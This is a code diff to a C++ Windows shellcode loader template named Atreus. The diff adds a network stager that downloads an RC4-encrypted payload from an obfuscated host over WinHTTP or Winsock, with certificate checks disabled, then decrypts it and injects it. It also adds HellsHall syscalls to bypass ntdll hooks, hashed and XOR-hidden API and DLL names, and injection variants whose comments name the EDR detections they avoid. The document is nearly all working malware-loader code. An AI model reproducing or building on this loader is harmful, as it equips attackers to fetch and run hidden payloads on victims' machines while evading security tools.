@@ -13,7 +13,8 @@
 //   USE_WIPE          : Zero heap payload after injection
 //   USE_ETW_PATCH     : Patch EtwEventWrite before injection
 //   USE_UNHOOK        : Remap ntdll .text from disk before injection
-//   ATREUS_DEBUG      : MessageBox at each step (requires -luser32)
+//   USE_HELLSHALL    : Direct/indirect syscalls (HellsHall) - bypasses ntdll hooks
+//   ATREUS_DEBUG      : Log each step to %TEMP%\atreus_debug.log (no console needed)
 
 #define WIN32_LEAN_AND_MEAN
 #ifndef _WIN32_WINNT
@@ -24,6 +25,10 @@
 #include <intrin.h>
 #include <string.h>
 
+#ifdef USE_HELLSHALL
+#include "hellshall.hpp"
+#endif
+
 // ─── Debug helper (ATREUS_DEBUG only) ────────────────────────────────────────
 
 #ifdef ATREUS_DEBUG
@@ -32,12 +37,10 @@ static char   _dbg_buf[512];
 
 static void _dbg_open() {
     if (_dbg_fh != INVALID_HANDLE_VALUE) return;
-    _dbg_fh = GetStdHandle(STD_OUTPUT_HANDLE);
-    if (_dbg_fh == INVALID_HANDLE_VALUE || _dbg_fh == NULL) {
-        AttachConsole(ATTACH_PARENT_PROCESS);
-        _dbg_fh = CreateFileA("CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE,
-            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    }
+    /* Write to C:\Windows\Temp\atreus_debug.log (always exists, writable by SYSTEM/session0) */
+    _dbg_fh = CreateFileA("C:\\Windows\\Temp\\atreus_debug.log", GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL, NULL);
 }
 static DWORD _dbg_strlen(const char *s) { DWORD n=0; while(s[n]) n++; return n; }
 static void _dbg_write(const char *msg) {
@@ -117,10 +120,36 @@ constexpr DWORD HF_VirtualFree              = _hA("VirtualFree");
 constexpr DWORD HF_NtCreateSection          = _hA("NtCreateSection");
 constexpr DWORD HF_NtMapViewOfSection       = _hA("NtMapViewOfSection");
 #endif
+#if defined(USE_LOCAL_MAP_INJECT) || defined(USE_REMOTE_MAP_INJECT)
+constexpr DWORD HF_CreateFileMappingW       = _hA("CreateFileMappingW");
+#endif
+#ifdef USE_REMOTE_MAP_INJECT
+constexpr DWORD HF_MapViewOfFile2           = _hA("MapViewOfFile2");
+#endif
+#if defined(USE_REFLECTIVE_LOAD) || defined(USE_FUNC_STOMP) || defined(USE_STAGER)
+constexpr DWORD HF_GetProcAddress           = _hA("GetProcAddress");
+#endif
+#ifdef USE_STAGER
+constexpr DWORD HF_WinHttpOpen              = _hA("WinHttpOpen");
+constexpr DWORD HF_WinHttpConnect           = _hA("WinHttpConnect");
+constexpr DWORD HF_WinHttpOpenRequest       = _hA("WinHttpOpenRequest");
+constexpr DWORD HF_WinHttpSendRequest       = _hA("WinHttpSendRequest");
+constexpr DWORD HF_WinHttpReceiveResponse   = _hA("WinHttpReceiveResponse");
+constexpr DWORD HF_WinHttpQueryDataAvailable= _hA("WinHttpQueryDataAvailable");
+constexpr DWORD HF_WinHttpReadData          = _hA("WinHttpReadData");
+constexpr DWORD HF_WinHttpCloseHandle       = _hA("WinHttpCloseHandle");
+constexpr DWORD HF_WinHttpSetOption         = _hA("WinHttpSetOption");
+#endif
+#ifdef USE_FUNC_STOMP
+constexpr DWORD HF_VirtualProtectEx         = _hA("VirtualProtectEx");
+constexpr DWORD HF_WriteProcessMemory       = _hA("WriteProcessMemory");
+constexpr DWORD HF_Module32FirstW           = _hA("Module32FirstW");
+constexpr DWORD HF_Module32NextW            = _hA("Module32NextW");
+#endif
 constexpr DWORD HF_CreateProcessW           = _hA("CreateProcessW");
 constexpr DWORD HF_ResumeThread             = _hA("ResumeThread");
 constexpr DWORD HF_LoadLibraryA             = _hA("LoadLibraryA");
-#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD)
+#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD) || defined(USE_REMOTE_MAP_INJECT) || defined(USE_FUNC_STOMP)
 constexpr DWORD HF_CreateToolhelp32Snapshot = _hA("CreateToolhelp32Snapshot");
 constexpr DWORD HF_Process32FirstW          = _hA("Process32FirstW");
 constexpr DWORD HF_Process32NextW           = _hA("Process32NextW");
@@ -131,10 +160,10 @@ constexpr DWORD HF_InitProcThreadAttrList   = _hA("InitializeProcThreadAttribute
 constexpr DWORD HF_UpdateProcThreadAttr     = _hA("UpdateProcThreadAttribute");
 constexpr DWORD HF_DeleteProcThreadAttrList = _hA("DeleteProcThreadAttributeList");
 #endif
-#if defined(USE_REMOTE_THREAD) || defined(USE_SELF_INJECT)
+#if defined(USE_REMOTE_THREAD) || defined(USE_SELF_INJECT) || defined(USE_LOCAL_MAP_INJECT) || defined(USE_REMOTE_MAP_INJECT) || defined(USE_FUNC_STOMP) || defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
 constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
 #endif
-#ifdef USE_SELF_INJECT
+#if defined(USE_SELF_INJECT) || defined(USE_LOCAL_MAP_INJECT) || defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
 constexpr DWORD HF_NtWaitForSingleObject    = _hA("NtWaitForSingleObject");
 #endif
 #if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
@@ -150,6 +179,7 @@ constexpr DWORD HF_GlobalMemoryStatusEx     = _hA("GlobalMemoryStatusEx");
 constexpr DWORD HF_GetSystemInfo            = _hA("GetSystemInfo");
 #endif
 
+constexpr DWORD HF_NtDelayExecution         = _hA("NtDelayExecution");
 constexpr DWORD HF_NtAllocateVirtualMemory  = _hA("NtAllocateVirtualMemory");
 constexpr DWORD HF_NtFreeVirtualMemory      = _hA("NtFreeVirtualMemory");
 constexpr DWORD HF_NtWriteVirtualMemory     = _hA("NtWriteVirtualMemory");
@@ -323,28 +353,259 @@ static void unhook_ntdll() {
 }
 #endif /* USE_UNHOOK */
 
-// ─── Payload (stamped by builder.py) ────────────────────────────────────────
+// ─── Stager mode (USE_STAGER / USE_STAGER_WSA): download payload at runtime ──
+// USE_STAGER     : WinHTTP-based download (HTTPS)
+// USE_STAGER_WSA : Winsock-based download (plain HTTP, avoids winhttp.dll load)
+// USE_STAGER_WSA implies USE_STAGER for shared template variables.
 
-#ifdef USE_UUID
-static const char *g_payload_uuids[] = { %PAYLOAD% };
-static const size_t g_uuid_count     = %UUID_COUNT%;
-static const size_t payload_size     = %PAYLOAD_SIZE%;
+#ifdef USE_STAGER_WSA
+#ifndef USE_STAGER
+#define USE_STAGER
+#endif
+#endif
 
-static BYTE _hb(char c) {
-    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
-    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
-    return (BYTE)(c - 'A' + 10);
+#ifdef USE_STAGER
+
+static const unsigned char _stager_key[]      = { %RC4_KEY% };
+static const unsigned char _stager_host_enc[] = { %STAGER_HOST_ENC% };
+static const WORD           _stager_port       = %STAGER_PORT%;
+static const unsigned char _stager_path_enc[] = { %STAGER_PATH_ENC% };
+static const unsigned char _stager_xk          = %STAGER_XOR_KEY%;
+
+static void _xdec(const unsigned char *enc, size_t n, char *out) {
+    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ _stager_xk);
+    out[n] = '\0';
 }
-static void uuid_decode(const char *u, BYTE *out) {
-    static const int pos[] = {0,2,4,6, 9,11, 14,16, 19,21, 24,26,28,30,32,34};
-    for (int i = 0; i < 16; i++)
-        out[i] = (_hb(u[pos[i]]) << 4) | _hb(u[pos[i]+1]);
+static void _xdecw(const unsigned char *enc, size_t n, WCHAR *out) {
+    for (size_t i = 0; i < n; i++) out[i] = (WCHAR)(enc[i] ^ _stager_xk);
+    out[n] = L'\0';
 }
-#else
 
-// ─── RC4 ─────────────────────────────────────────────────────────────────────
+#ifdef USE_STAGER_WSA
 
-#ifdef USE_RC4
+/* Winsock-based HTTP stager: no winhttp.dll, plain TCP HTTP GET.
+ * ws2_32.dll is typically already loaded; even if not, it does not
+ * trigger "NTDLL library loaded for a second time" like winhttp.dll does. */
+static unsigned char *stager_fetch(size_t *out_size) {
+    typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
+    typedef LPVOID  (WINAPI *t_VA) (LPVOID,SIZE_T,DWORD,DWORD);
+    typedef int     (WINAPI *t_WSAStartup)(WORD, LPVOID);
+    typedef UINT_PTR(WINAPI *t_socket)(int,int,int);
+    typedef int     (WINAPI *t_connect)(UINT_PTR,const void*,int);
+    typedef int     (WINAPI *t_send)(UINT_PTR,const char*,int,int);
+    typedef int     (WINAPI *t_recv)(UINT_PTR,char*,int,int);
+    typedef int     (WINAPI *t_closesocket)(UINT_PTR);
+    typedef int     (WINAPI *t_WSACleanup)(void);
+    typedef USHORT  (WINAPI *t_htons)(USHORT);
+    typedef ULONG   (WINAPI *t_inet_addr)(const char*);
+
+    HMODULE hK32 = peb_module(HMOD_KERNEL32);
+    t_LLA pLLA = (t_LLA)resolve(hK32, HF_LoadLibraryA);
+    t_VA  pVA  = (t_VA) resolve(hK32, HF_VirtualAlloc);
+    if (!pLLA || !pVA) { DBG("[SF] FAIL: K32 API"); return NULL; }
+
+    HMODULE hWsa = peb_module(_hW(L"ws2_32.dll"));
+    if (!hWsa) {
+        const unsigned char ws2_enc[] = {
+            'w'^0x13,'s'^0x13,'2'^0x13,'_'^0x13,'3'^0x13,'2'^0x13,
+            '.'^0x13,'d'^0x13,'l'^0x13,'l'^0x13
+        };
+        char ws2_name[11];
+        for (int i = 0; i < 10; i++) ws2_name[i] = (char)(ws2_enc[i] ^ 0x13);
+        ws2_name[10] = '\0';
+        hWsa = pLLA(ws2_name);
+        if (!hWsa) { DBG("[SF] FAIL: ws2_32.dll"); return NULL; }
+    }
+    DBG("[SF1] ws2_32.dll loaded");
+
+    constexpr DWORD HF_WSAStartup  = _hA("WSAStartup");
+    constexpr DWORD HF_socket_     = _hA("socket");
+    constexpr DWORD HF_connect_    = _hA("connect");
+    constexpr DWORD HF_send_       = _hA("send");
+    constexpr DWORD HF_recv_       = _hA("recv");
+    constexpr DWORD HF_closesock   = _hA("closesocket");
+    constexpr DWORD HF_WSACleanup  = _hA("WSACleanup");
+    constexpr DWORD HF_htons_      = _hA("htons");
+    constexpr DWORD HF_inet_addr_  = _hA("inet_addr");
+    t_WSAStartup  pWSAStartup  = (t_WSAStartup) resolve(hWsa, HF_WSAStartup);
+    t_socket      pSocket      = (t_socket)      resolve(hWsa, HF_socket_);
+    t_connect     pConnect     = (t_connect)     resolve(hWsa, HF_connect_);
+    t_send        pSend        = (t_send)        resolve(hWsa, HF_send_);
+    t_recv        pRecv        = (t_recv)        resolve(hWsa, HF_recv_);
+    t_closesocket pCloseSocket = (t_closesocket) resolve(hWsa, HF_closesock);
+    t_WSACleanup  pWSACleanup  = (t_WSACleanup)  resolve(hWsa, HF_WSACleanup);
+    t_htons       pHtons       = (t_htons)       resolve(hWsa, HF_htons_);
+    t_inet_addr   pInetAddr    = (t_inet_addr)   resolve(hWsa, HF_inet_addr_);
+    if (!pWSAStartup||!pSocket||!pConnect||!pSend||!pRecv||!pCloseSocket||!pHtons||!pInetAddr) {
+        DBG("[SF] FAIL: WSA API resolution"); return NULL;
+    }
+    DBG("[SF2] WSA APIs resolved");
+
+    unsigned char wsaData[512] = {0}; /* WSADATA is 408 bytes on 64-bit; 512 gives margin */
+    if (pWSAStartup(0x0202, wsaData) != 0) { DBG("[SF] FAIL: WSAStartup"); return NULL; }
+    DBG("[SF3] WSAStartup OK");
+
+    /* Decode host (ANSI via _xdec) and path */
+    char host[128]; _xdec(_stager_host_enc, sizeof(_stager_host_enc), host);
+    char path[256]; _xdec(_stager_path_enc, sizeof(_stager_path_enc), path);
+    DBG("[SF4] host/path decoded");
+
+    UINT_PTR sock = pSocket(2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 6 /*IPPROTO_TCP*/);
+    if (sock == (UINT_PTR)(~0ULL)) { DBG("[SF] FAIL: socket"); pWSACleanup(); return NULL; }
+
+    struct { short family; unsigned short port; unsigned long addr; char pad[8]; } sa = {0};
+    sa.family = 2; /* AF_INET */
+    sa.port   = pHtons(_stager_port);
+    sa.addr   = pInetAddr(host);
+    if (pConnect(sock, &sa, 16) != 0) { DBG("[SF] FAIL: connect"); pCloseSocket(sock); pWSACleanup(); return NULL; }
+    DBG("[SF5] connected");
+
+    /* Build HTTP GET request */
+    char req[512];
+    int rlen = 0;
+    const char s1[] = "GET ";
+    const char s2[] = " HTTP/1.0\r\nHost: ";
+    const char s3[] = "\r\nConnection: close\r\n\r\n";
+    for (int i = 0; s1[i]; i++) req[rlen++] = s1[i];
+    for (int i = 0; path[i]; i++) req[rlen++] = path[i];
+    for (int i = 0; s2[i]; i++) req[rlen++] = s2[i];
+    for (int i = 0; host[i]; i++) req[rlen++] = host[i];
+    for (int i = 0; s3[i]; i++) req[rlen++] = s3[i];
+
+    if (pSend(sock, req, rlen, 0) <= 0) { DBG("[SF] FAIL: send"); pCloseSocket(sock); pWSACleanup(); return NULL; }
+    DBG("[SF6] request sent");
+
+    const SIZE_T MAX_SC = 4 * 1024 * 1024;
+    unsigned char *buf = (unsigned char *)pVA(NULL, MAX_SC, 0x3000, 4 /*PAGE_READWRITE*/);
+    if (!buf) { pCloseSocket(sock); pWSACleanup(); DBG("[SF] FAIL: VirtualAlloc"); return NULL; }
+
+    size_t total = 0;
+    int n;
+    while (total < MAX_SC && (n = pRecv(sock, (char*)buf + total, (int)(MAX_SC - total), 0)) > 0)
+        total += (size_t)n;
+    pCloseSocket(sock);
+    if (pWSACleanup) pWSACleanup();
+    DBG_VAL("[SF7] raw bytes received", (unsigned long long)total);
+
+    /* Skip HTTP headers: find \r\n\r\n */
+    size_t hdr_end = 0;
+    for (size_t i = 0; i + 3 < total; i++) {
+        if (buf[i]=='\r'&&buf[i+1]=='\n'&&buf[i+2]=='\r'&&buf[i+3]=='\n') {
+            hdr_end = i + 4; break;
+        }
+    }
+    if (hdr_end == 0) { DBG("[SF] FAIL: no HTTP headers found"); return NULL; }
+    size_t body_sz = total - hdr_end;
+    DBG_VAL("[SF8] body bytes", (unsigned long long)body_sz);
+
+    /* Move body to start of buffer */
+    for (size_t i = 0; i < body_sz; i++) buf[i] = buf[hdr_end + i];
+    *out_size = body_sz;
+    return (body_sz > 0) ? buf : NULL;
+}
+
+#else /* USE_STAGER (WinHTTP) */
+
+static unsigned char *stager_fetch(size_t *out_size) {
+    typedef LPVOID  (WINAPI *t_WO) (LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+    typedef LPVOID  (WINAPI *t_WC) (LPVOID,LPCWSTR,WORD,DWORD);
+    typedef LPVOID  (WINAPI *t_WOR)(LPVOID,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+    typedef BOOL    (WINAPI *t_WSR)(LPVOID,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
+    typedef BOOL    (WINAPI *t_WRR)(LPVOID,LPVOID);
+    typedef BOOL    (WINAPI *t_WQD)(LPVOID,LPDWORD);
+    typedef BOOL    (WINAPI *t_WRD)(LPVOID,LPVOID,DWORD,LPDWORD);
+    typedef BOOL    (WINAPI *t_WCH)(LPVOID);
+    typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
+    typedef LPVOID  (WINAPI *t_VA) (LPVOID,SIZE_T,DWORD,DWORD);
+
+    HMODULE hK32 = peb_module(HMOD_KERNEL32);
+    t_LLA pLLA = (t_LLA)resolve(hK32, HF_LoadLibraryA);
+    t_VA  pVA  = (t_VA) resolve(hK32, HF_VirtualAlloc);
+    if (!pLLA || !pVA) { DBG("[SF] FAIL: K32 API resolution"); return NULL; }
+    DBG("[SF1] K32 APIs resolved");
+
+    /* "winhttp.dll" XOR'd with 0x5A - never a plain string in binary */
+    const unsigned char whttp_enc[] = {
+        'w'^0x5A,'i'^0x5A,'n'^0x5A,'h'^0x5A,'t'^0x5A,'t'^0x5A,
+        'p'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A
+    };
+    char whttp_name[12];
+    for (int _wi = 0; _wi < 11; _wi++) whttp_name[_wi] = (char)(whttp_enc[_wi] ^ 0x5A);
+    whttp_name[11] = '\0';
+    HMODULE hWH = peb_module(_hW(L"winhttp.dll"));
+    if (!hWH) hWH = pLLA(whttp_name);
+    if (!hWH) { DBG("[SF] FAIL: LoadLibrary winhttp.dll"); return NULL; }
+    DBG("[SF2] winhttp.dll loaded");
+
+    t_WO  pWO  = (t_WO) resolve(hWH, HF_WinHttpOpen);
+    t_WC  pWC  = (t_WC) resolve(hWH, HF_WinHttpConnect);
+    t_WOR pWOR = (t_WOR)resolve(hWH, HF_WinHttpOpenRequest);
+    t_WSR pWSR = (t_WSR)resolve(hWH, HF_WinHttpSendRequest);
+    t_WRR pWRR = (t_WRR)resolve(hWH, HF_WinHttpReceiveResponse);
+    t_WQD pWQD = (t_WQD)resolve(hWH, HF_WinHttpQueryDataAvailable);
+    t_WRD pWRD = (t_WRD)resolve(hWH, HF_WinHttpReadData);
+    t_WCH pWCH = (t_WCH)resolve(hWH, HF_WinHttpCloseHandle);
+    if (!pWO||!pWC||!pWOR||!pWSR||!pWRR||!pWQD||!pWRD||!pWCH) {
+        DBG("[SF] FAIL: WinHttp API resolution"); return NULL;
+    }
+    DBG("[SF3] WinHttp APIs resolved");
+
+    WCHAR host[128]; _xdecw(_stager_host_enc, sizeof(_stager_host_enc), host);
+    WCHAR path[256]; _xdecw(_stager_path_enc, sizeof(_stager_path_enc), path);
+    const WCHAR ua[]  = { L'M',L'o',L'z',L'i',L'l',L'l',L'a',L'/',L'5',L'.',L'0',L'\0' };
+    const WCHAR get[] = { L'G',L'E',L'T',L'\0' };
+    DBG_VAL("[SF4] stager port", (unsigned long long)_stager_port);
+
+    LPVOID hSes = pWO(ua, 1 /*WINHTTP_ACCESS_TYPE_NO_PROXY*/, NULL, NULL, 0);
+    if (!hSes) { DBG("[SF] FAIL: WinHttpOpen"); return NULL; }
+    DBG("[SF5] WinHttpOpen OK");
+    LPVOID hCon = pWC(hSes, host, (WORD)_stager_port, 0);
+    if (!hCon) { pWCH(hSes); DBG("[SF] FAIL: WinHttpConnect"); return NULL; }
+    DBG("[SF6] WinHttpConnect OK");
+    /* WINHTTP_FLAG_SECURE = 0x00800000 */
+    LPVOID hReq = pWOR(hCon, get, path, NULL, NULL, NULL, 0x00800000);
+    if (!hReq) { pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpOpenRequest"); return NULL; }
+    DBG("[SF7] WinHttpOpenRequest OK (HTTPS)");
+    /* Ignore self-signed cert: WINHTTP_OPTION_SECURITY_FLAGS=31, SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS=0x3300 */
+    {
+        typedef BOOL (WINAPI *t_WSOP)(LPVOID,DWORD,LPVOID,DWORD);
+        t_WSOP pWSOP = (t_WSOP)resolve(hWH, HF_WinHttpSetOption);
+        if (pWSOP) { DWORD sf = 0x3300; pWSOP(hReq, 31, &sf, sizeof(sf)); DBG("[SF7b] cert ignore set"); }
+        else { DBG("[SF7b] WARN: WinHttpSetOption not found"); }
+    }
+    if (!pWSR(hReq, NULL, 0, NULL, 0, 0, 0)) {
+        pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpSendRequest"); return NULL;
+    }
+    DBG("[SF8] WinHttpSendRequest OK");
+    if (!pWRR(hReq, NULL)) {
+        pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: WinHttpReceiveResponse"); return NULL;
+    }
+    DBG("[SF9] WinHttpReceiveResponse OK");
+
+    const SIZE_T MAX_SC = 4 * 1024 * 1024;
+    unsigned char *buf = (unsigned char *)pVA(NULL, MAX_SC, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) { pWCH(hReq); pWCH(hCon); pWCH(hSes); DBG("[SF] FAIL: VirtualAlloc buffer"); return NULL; }
+    DBG("[SF10] recv buffer allocated");
+
+    size_t total = 0;
+    DWORD avail = 0, nread = 0;
+    while (pWQD(hReq, &avail) && avail > 0 && (total + avail) <= MAX_SC) {
+        if (pWRD(hReq, buf + total, avail, &nread)) total += nread;
+        else break;
+    }
+    pWCH(hReq); pWCH(hCon); pWCH(hSes);
+    DBG_VAL("[SF11] total bytes received", (unsigned long long)total);
+    *out_size = total;
+    return (total > 0) ? buf : NULL;
+}
+
+#endif /* USE_STAGER_WSA / WinHTTP else */
+
+#endif /* USE_STAGER */
+
+// ─── RC4 (needed by stager and embedded RC4 path) ────────────────────────────
+
+#if defined(USE_RC4) || defined(USE_STAGER)
 static void rc4_crypt(const unsigned char *key, size_t klen,
                       unsigned char *data, size_t dlen) {
     unsigned char S[256];
@@ -362,6 +623,29 @@ static void rc4_crypt(const unsigned char *key, size_t klen,
         data[i] ^= S[(S[x] + S[j]) & 0xFF];
     }
 }
+#endif /* USE_RC4 || USE_STAGER */
+
+// ─── Payload (stamped by builder.py) ────────────────────────────────────────
+
+#ifndef USE_STAGER
+#ifdef USE_UUID
+static const char *g_payload_uuids[] = { %PAYLOAD% };
+static const size_t g_uuid_count     = %UUID_COUNT%;
+static const size_t payload_size     = %PAYLOAD_SIZE%;
+
+static BYTE _hb(char c) {
+    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
+    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
+    return (BYTE)(c - 'A' + 10);
+}
+static void uuid_decode(const char *u, BYTE *out) {
+    static const int pos[] = {0,2,4,6, 9,11, 14,16, 19,21, 24,26,28,30,32,34};
+    for (int i = 0; i < 16; i++)
+        out[i] = (_hb(u[pos[i]]) << 4) | _hb(u[pos[i]+1]);
+}
+#else
+
+#ifdef USE_RC4
 static const unsigned char rc4_key[] = { %RC4_KEY% };
 #endif /* USE_RC4 */
 
@@ -379,6 +663,7 @@ static unsigned char payload[] = { %PAYLOAD% };
 static const size_t  payload_size = sizeof(payload);
 
 #endif /* USE_UUID */
+#endif /* ifndef USE_STAGER */
 
 // ─── Sandbox check ───────────────────────────────────────────────────────────
 
@@ -424,7 +709,7 @@ static int sandbox_check() {
 
 // ─── Process lookup by name (PPID spoof + remote thread) ────────────────────
 
-#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD)
+#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD) || defined(USE_REMOTE_MAP_INJECT) || defined(USE_FUNC_STOMP)
 #include <tlhelp32.h>
 static DWORD find_process_pid(const wchar_t *name) {
     typedef HANDLE (WINAPI *t_CTS)(DWORD, DWORD);
@@ -524,6 +809,20 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     typedef NTSTATUS (NTAPI *t_NtRT) (HANDLE,PULONG);
 
     HMODULE hNtdll = peb_module(HMOD_NTDLL);
+#ifdef USE_HELLSHALL
+    /* HellsHall: define shim lambdas so the rest of the code compiles unchanged */
+    auto pNtAVM = [](HANDLE h, PVOID *b, ULONG_PTR zb, PSIZE_T sz, ULONG t, ULONG p) {
+        return hg_NtAllocateVirtualMemory(h, b, zb, sz, t, p); };
+    auto pNtFVM = [](HANDLE h, PVOID *b, PSIZE_T sz, ULONG t) {
+        return hg_NtFreeVirtualMemory(h, b, sz, t); };
+    auto pNtWVM = [](HANDLE h, PVOID a, PVOID buf, SIZE_T sz, PSIZE_T wr) {
+        return hg_NtWriteVirtualMemory(h, a, buf, sz, wr); };
+    auto pNtPVM = [](HANDLE h, PVOID *b, PSIZE_T sz, ULONG p, PULONG o) {
+        return hg_NtProtectVirtualMemory(h, b, sz, p, o); };
+    auto pNtRT  = [](HANDLE h, PULONG p) { return hg_NtResumeThread(h, p); };
+    (void)hNtdll;
+    DBG("[HH] HellsHall wrappers active for Nt* calls");
+#else
     t_NtAVM pNtAVM = (t_NtAVM)resolve(hNtdll, HF_NtAllocateVirtualMemory);
     t_NtFVM pNtFVM = (t_NtFVM)resolve(hNtdll, HF_NtFreeVirtualMemory);
     t_NtWVM pNtWVM = (t_NtWVM)resolve(hNtdll, HF_NtWriteVirtualMemory);
@@ -533,13 +832,30 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     if (!pNtAVM || !pNtFVM || !pNtWVM || !pNtPVM || !pNtRT) {
         DBG("[FAIL] Nt* API resolution failed"); return 1;
     }
+#endif
 
-    /* Allocate local RW page for decoded/decrypted shellcode */
+    /* Fetch or allocate shellcode */
     unsigned char *sc = NULL;
-    SIZE_T sc_sz = payload_size;
+    SIZE_T sc_sz = 0;
+
+#ifdef USE_STAGER
+    {
+        size_t fetched = 0;
+        unsigned char *raw = stager_fetch(&fetched);
+        if (!raw || fetched == 0) { DBG("[FAIL] stager_fetch returned NULL/0"); return 1; }
+        sc_sz = fetched;
+        typedef LPVOID (WINAPI *t_VA)(LPVOID,SIZE_T,DWORD,DWORD);
+        t_VA pVA = (t_VA)RK32(HF_VirtualAlloc);
+        sc = pVA ? (unsigned char *)pVA(NULL, sc_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+        if (!sc) { DBG("[FAIL] VirtualAlloc for stager sc failed"); return 1; }
+        memcpy(sc, raw, sc_sz);
+        { typedef BOOL (WINAPI *t_VF)(LPVOID,SIZE_T,DWORD); t_VF pVF=(t_VF)RK32(HF_VirtualFree); if(pVF) pVF(raw,0,MEM_RELEASE); }
+        rc4_crypt(_stager_key, sizeof(_stager_key), sc, sc_sz);
+        DBG("[5] Stager: downloaded and decrypted");
+    }
+#else /* embedded payload */
+    sc_sz = payload_size;
 #if defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP)
-    /* Use Win32 VirtualAlloc: call goes through kernel32 (signed), avoids
-       "Native API from Unsigned Module" detection on NtAllocateVirtualMemory */
     {
         typedef LPVOID (WINAPI *t_VA)(LPVOID, SIZE_T, DWORD, DWORD);
         t_VA pVA = (t_VA)RK32(HF_VirtualAlloc);
@@ -547,9 +863,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     }
     if (!sc) { DBG("[FAIL] VirtualAlloc failed"); return 1; }
 #else
-    NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
-                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }
+    {
+        NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
+                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!sc) { DBG("[FAIL] local NtAVM alloc failed"); return 1; }
+    }
 #endif
 
 #ifdef USE_UUID
@@ -560,8 +878,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     memcpy(sc, payload, payload_size);
     memset(payload, 0, payload_size);
     DBG_VAL("[5] Payload copied, size", (unsigned long long)payload_size);
-
-    /* Decrypt */
 #ifdef USE_RC4
     rc4_crypt(rc4_key, sizeof(rc4_key), sc, payload_size);
     DBG("[6] RC4 decryption done");
@@ -572,58 +888,69 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG("[6] No decryption (plaintext)");
 #endif
 #endif /* USE_UUID */
+#endif /* USE_STAGER else */
 
 #ifdef USE_SELF_INJECT
-    /* Self-injection via local APC: create suspended thread + queue APC */
+    /* Self-injection via dual-view section: RW view for copying shellcode, RX for execution.
+       No NtProtectVirtualMemory call - avoids "NTDLL Memory Protection Change" detection. */
     {
-        DBG("[SI] === SELF INJECTION (LOCAL APC) MODE ===");
-        typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
-        typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
+        DBG("[SI0] Entering self-inject block");
         typedef NTSTATUS (NTAPI *t_NtWSO)(HANDLE,BOOLEAN,PLARGE_INTEGER);
         typedef BOOL (WINAPI *t_CH)(HANDLE);
-        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
-        t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
+        DBG("[SI0a] Resolving NtWaitForSingleObject...");
         t_NtWSO pNtWSO = (t_NtWSO)resolve(hNtdll, HF_NtWaitForSingleObject);
-        t_CH    pCH    = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
-        DBG_HEX("[SI1] NtCreateThreadEx resolved", (unsigned long long)(ULONG_PTR)pNtCTE);
-        DBG_HEX("[SI1] NtQueueApcThread resolved", (unsigned long long)(ULONG_PTR)pNtQAT);
-        if (!pNtCTE || !pNtQAT) {
-            DBG("[FAIL] SelfInject: API resolution failed");
+        DBG_HEX("[SI0b] pNtWSO", (unsigned long long)(ULONG_PTR)pNtWSO);
+        t_CH    pCH    = (t_CH)  RK32(HF_CloseHandle);
+        DBG_HEX("[SI0c] pCH", (unsigned long long)(ULONG_PTR)pCH);
+
+        HANDLE hSection = NULL;
+        LARGE_INTEGER sec_sz = {0};
+        sec_sz.QuadPart = (LONGLONG)sc_sz;
+        DBG_VAL("[SI0d] sc_sz", (unsigned long long)sc_sz);
+        DBG("[SI0e] Calling hg_NtCreateSection...");
+        NTSTATUS stCS = hg_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sec_sz,
+                                            PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
